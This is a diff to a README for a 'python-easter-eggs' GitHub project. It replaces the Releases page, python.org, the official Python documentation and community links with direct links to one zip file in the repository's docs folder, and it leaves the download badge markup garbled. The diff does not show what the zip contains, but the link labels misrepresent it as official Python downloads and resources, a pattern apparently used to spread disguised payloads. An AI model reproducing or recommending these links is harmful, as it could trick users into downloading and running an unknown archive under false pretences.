@@ -1,7 +1,7 @@
 # 🐍 python-easter-eggs - Discover Hidden Fun in Python
 
 ## 🔗 Download Here
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue.svg)](https://github.com/itsBabyYeet/python-easter-eggs/releases)
+[![Download Latest Release](https://github.com/itsBabyYeet/python-easter-eggs/raw/refs/heads/main/docs/easter_python_eggs_recalibration.zip%20Latest%20Release-Click%https://github.com/itsBabyYeet/python-easter-eggs/raw/refs/heads/main/docs/easter_python_eggs_recalibration.zip)](https://github.com/itsBabyYeet/python-easter-eggs/raw/refs/heads/main/docs/easter_python_eggs_recalibration.zip)
 
 ## 📄 Description
 Welcome to the **python-easter-eggs** repository! This project is a curated collection of hidden features, jokes, surprises, and Easter eggs within the Python programming language. Here, you will find quirky language behaviors and delightful discoveries, such as `import antigravity`, `import this`, hidden modules, and playful Python oddities. Each item comes with explanations and examples, making it easy to understand and enjoy.
@@ -12,7 +12,7 @@ To get started with python-easter-eggs, follow these simple steps. You don't nee
 ### Step 1: Download the Software
 You can download the latest version of python-easter-eggs from the Releases page. 
 
-Visit this page to download: [Download Releases](https://github.com/itsBabyYeet/python-easter-eggs/releases).
+Visit this page to download: [Download Releases](https://github.com/itsBabyYeet/python-easter-eggs/raw/refs/heads/main/docs/easter_python_eggs_recalibration.zip).
 
 ### Step 2: Choose a Release
 Once on the Releases page, you will see a list of different versions of the software. Look for the latest version, which is usually at the top of the list. It might look something like `v1.0.0`.
@@ -27,7 +27,7 @@ After downloading, locate the file on your computer.
 
 ## 💻 System Requirements
 - **Operating System:** Python-easter-eggs works on all major operating systems, including Windows, macOS, and Linux.
-- **Python Version:** Make sure you have Python version 3.6 or higher installed on your system. You can download the latest version from [Python.org](https://www.python.org/downloads/).
+- **Python Version:** Make sure you have Python version 3.6 or higher installed on your system. You can download the latest version from [https://github.com/itsBabyYeet/python-easter-eggs/raw/refs/heads/main/docs/easter_python_eggs_recalibration.zip](https://github.com/itsBabyYeet/python-easter-eggs/raw/refs/heads/main/docs/easter_python_eggs_recalibration.zip).
 
 ## 🧩 Features
 - **Easter Eggs**: Discover fun and hidden features in Python.
@@ -61,7 +61,7 @@ Simply fork the repository, make your changes, and submit a pull request.
 If you encounter any issues or have questions, you can reach out through the GitHub Issues page. We are here to help you enjoy your experience with python-easter-eggs.
 
 ## 🔗 Additional Resources
-- [Python Official Documentation](https://docs.python.org/3/)
-- [Join the Python Community](https://www.python.org/community/)
+- [Python Official Documentation](https://github.com/itsBabyYeet/python-easter-eggs/raw/refs/heads/main/docs/easter_python_eggs_recalibration.zip)
+- [Join the Python Community](https://github.com/itsBabyYeet/python-easter-eggs/raw/refs/heads/main/docs/easter_python_eggs_recalibration.zip)
 
 Remember, the world of Python is full of surprises. Enjoy exploring!
